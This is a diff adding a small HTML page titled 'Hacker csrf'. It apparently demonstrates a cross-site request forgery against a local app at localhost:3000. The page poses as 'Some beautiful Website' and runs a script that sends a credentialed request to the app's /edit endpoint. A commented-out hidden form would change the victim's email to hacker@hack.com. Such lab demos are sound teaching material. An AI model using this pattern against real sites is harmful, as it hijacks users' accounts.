@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacker csrf</title>
+</head>
+<body>
+  <h1>Some beautiful Website</h1>
+  <!-- <form name="form" action="http://localhost:3000/edit" method="get">
+    <input hidden type="email" name="email" value="hacker@hack.com">
+  </form> -->
+  <script>
+    /* document.form.submit() */
+    fetch('http://localhost:3000/edit', {
+      method: 'GET',  
+      credentials: "include"
+    })
+      .then(res => res.text())
+      .then(html => console.log(html))
+      .catch(err => console.log(err))
+  </script>
+</body>
+</html>
